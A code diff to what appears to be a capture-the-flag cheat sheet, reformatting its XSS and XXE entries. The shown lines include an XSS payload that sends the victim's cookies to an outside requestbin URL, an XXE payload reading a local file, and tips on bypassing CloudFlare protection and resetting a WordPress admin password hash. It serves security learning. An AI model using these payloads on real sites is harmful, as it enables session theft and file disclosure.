@@ -823,7 +823,7 @@ Web
 * [XSS]/[Cross-site scripting]
 
 	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML] and ideally inject [JavaScript] code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:
-new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
+
 
 ```
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
@@ -834,7 +834,7 @@ new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-s
 ```
 <img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
 ```
-
+* new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
 * [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)
 
 	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.
@@ -873,9 +873,12 @@ def kcpasswd(ciphertext):
         result += chr(ord(ciphertext[i]) ^ (key[i]))
     return result
 ```
-* XXE : 
-We try to display the content of the file /flag
+* XXE : XML External Entity
 
+An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
+We try to display the content of the file /flag :
+
+```
 <?xml version="1.0"?>
 <!DOCTYPE data [
 <!ELEMENT data (#ANY)>
@@ -887,6 +890,8 @@ We try to display the content of the file /flag
   <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
+  
+  ```
 * Wordpress Password Hash Generator
 
 	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.
